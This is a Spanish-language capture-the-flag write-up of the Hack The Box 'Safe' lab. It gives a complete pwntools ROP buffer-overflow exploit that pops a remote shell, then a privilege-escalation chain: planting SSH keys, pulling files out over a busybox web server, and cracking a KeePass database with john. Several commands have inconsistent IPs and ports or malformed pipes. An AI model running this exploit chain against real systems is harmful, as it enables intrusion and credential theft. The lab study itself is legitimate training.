# Safe

### Tags
#### Buffer Overflow
#### Binary Exploitation

Empezamos lanzando nmap para ver que puertos y servicios que se están ejecutando.

![0](https://user-images.githubusercontent.com/50462944/174450002-4592b4e0-1b47-487e-95d7-a76c4e0b6a05.png)

Vemos que el puerto 80 y 1337 están abiertos.

Analizando la página se puede ver un comentario sobre el puerto 1337. 

![1](https://user-images.githubusercontent.com/50462944/174449826-9b702237-a914-4677-a066-f11224e3fc01.png)

Si accedemos a http://10.10.10.147/myapp, se descargará "myapp" que según el comentario se está ejecutando en ese puerto.


![2](https://user-images.githubusercontent.com/50462944/174450232-36dc8c6e-b2ec-4803-a879-e7eba0ce6010.png)

![3](https://user-images.githubusercontent.com/50462944/174449828-213d2e92-922f-4dc3-9496-b79cbcf842b1.png)

Viendo el servicio en 1337 y "myapp" podemos ver que es lo mismo.


![4](https://user-images.githubusercontent.com/50462944/174449829-80d951b4-d691-4329-aafb-27fced7f3a8a.png)

Analizando los strings legibles podemos ver que hay un /usr/bin/uptime y la pregunta que devuelve el programa.

Abrimos ghidra, y creamos un proyecto e importamos el archivo.

![s2](https://user-images.githubusercontent.com/50462944/174450325-c122d315-fef5-44ae-93b2-c38559494751.png)


![s4](https://user-images.githubusercontent.com/50462944/174449825-a44d5547-bd7e-4994-b4f7-92f6fb86f071.png)

Podemos ver una la función main, una variable local_78 con 112 bits, y una función a nivel de sistema.

Por lo que lo interesante sería poder cambiar el /usr/bin/uptime a un /bin/sh.

![6](https://user-images.githubusercontent.com/50462944/174449832-02c396f8-3dc8-479c-aa35-de1caedd6d0c.png)

Con gdb podemos ver las pilas.

![ksnip_20220618-161557](https://user-images.githubusercontent.com/50462944/174455304-4c4c91fb-402b-4be9-90e8-2786897e3e89.png)

Hacemos un breackpoint en la función main

![ksnip_20220618-152833](https://user-images.githubusercontent.com/50462944/174452172-8407bccd-b1b0-4658-a922-8db72cea2040.png)

Avanzamos en las pilas con "si" hasta system

![ksnip_20220618-152923](https://user-images.githubusercontent.com/50462944/174452229-eb448863-5294-43a9-83c5-ef4a58d762aa.png)

Se puede ver que el valor /usr/bin/uptime que es ejecutado a nivel de sistema está siendo guardado en la pila $rdi

![ksnip_20220618-153100](https://user-images.githubusercontent.com/50462944/174452266-ccb916ef-40de-4cda-9f84-b3fb9c87edb4.png)

```bash
~ python3 -c 'print("A"*120 + "B"*8 + "C"* 8)' # * 8 = x64 bits * 4 = x32 bits
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
```

Ahora podemos ver que $rsp puede ser cambiado 

![ksnip_20220618-152509](https://user-images.githubusercontent.com/50462944/174452383-5afba89a-3979-4e1f-8651-d7d6b7627d19.png)

Analizando la funcion test podemos ver "MOV     RDI, RSP" que significa que está moviendo los valores el $rsp al $rdi. Recordando que $rdi es lo que se ejecuta en system y $rsp es lo que podemos modificar.

![5](https://user-images.githubusercontent.com/50462944/174449816-a39c1be0-5b8c-43a6-9737-71165b201520.png)

Y obtenemos 0x401206 del "JUMP   r13", además tenemos en cuenta el R14 y el r15 por lo que en el payload lo haremos un null.

![ksnip_20220618-164803](https://user-images.githubusercontent.com/50462944/174455374-1ab2a865-9180-4a40-aa85-229d9e4304d4.png)

```bash
~ cat poc.py
from pwn import *

context(terminal=['tmux', 'new-window'])
context(os='linux', arch='amd64')

p = remote("10.10.10.147", 1337)

junk = b"A"*112
# Una vez pasadas las 112 "A" va a haber un desbordamiento. junk es el offset
# Le restamos 8 porque /bin/sh\x00 serian 8 caracteres
bin_sh = b"/bin/sh\x00"
# Y remplazamos en binario el $rdi 

#gef> ropper --search "pop r13"

pop_r13 = p64(0x401206)
null = p64(0x0)

# ~ objdump -D ./myapp | grep system

system_plt = p64(0x401040)

# ~ objdump -D ./myapp | grep test

test = p64(0x401152)

payload = junk + bin_sh + pop_r13 + system_plt + null + null + test

# junk: es el offset
# bin_sh: "/bin/sh"
# pop_r13: llamará a system_plt
# system_plt -> system()
# null y null es por = r13, r14 y 15

p.sendline(payload)
p.interactive()
```

Una vez lanzado el ataque obtenemos una bash.

![7](https://user-images.githubusercontent.com/50462944/174449830-73918c79-32f7-4b06-8eaa-1eb3f07c1f76.png)

## Root

Nos creamos las llaves y las copiamos.

```bash
~ ssh-keygen | cat id_rsa.pub  | tr -d '\n'
``` 

Y en el lab creamos el directorio ssh y ingresamos la clave publica.

```bash
mkdir .ssh | cd .ssh | echo "<key.pub>" > authorized_keys
```

Ahora podemos acceder por medio de ssh.

```bash
~ ssh user@10.10.10.142
```

En el lab creamos un recurso compartido.

```bash
~ busybox httpd -f -p 4545
```

```bash
wget http://10.10.10.142:4545/file
```

Nos traemos las imagenes y el .kdbx.

```bash
for i in IMG_0545.JPG IMG_0547.JPG IMG_0552.JPG IMG_0546.JPG IMG_0548.JPG IMG_0553.JPG MyPassword.kdbx; do wget http://10.10.10.147:4645/$i; done
```

Despues se crean los hashes con la key por imagen.

```bash
for i in IMG_0545.JPG IMG_0547.JPG IMG_0552.JPG IMG_0546.JPG IMG_0548.JPG IMG_0553.JPG; do keepass2john -k $i Mypassword.kdbx; done > hashes
```

```bash
john --wordlist=../rockyou.txt hashes
```

```bash
keepassxc MyPassword.kdbx
```

Por ultimo ingresamos la contraseña y la imagen como key.

para obtener root

```bash
su root
```
